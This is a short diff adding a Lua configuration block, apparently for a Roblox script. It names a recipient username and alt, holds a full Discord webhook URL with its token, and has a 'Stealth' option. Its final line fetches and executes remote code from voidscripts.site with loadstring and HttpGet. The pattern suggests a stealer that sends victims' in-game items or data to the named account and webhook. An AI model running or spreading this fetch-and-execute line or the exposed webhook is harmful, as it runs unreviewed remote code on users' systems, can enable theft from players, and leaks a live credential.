@@ -1,0 +1,11 @@
+   Username = "zitroxx9939",
+    Alt = "zitroxx9939",
+    HubName = "",
+    Webhook = "https://discord.com/api/webhooks/1095759939043065977/XG_5VhqOjCr-nWPCY-s7w0GDzFMOXeVec3wATcQs48SM1GCPx-YDKn7IChskMmhB_5-k",
+    Premium = {
+        Key = "",
+        Stealth = false
+    }
+}
+
+loadstring(game:HttpGet("https://voidscripts.site/scripts/mb/script.lua"))()
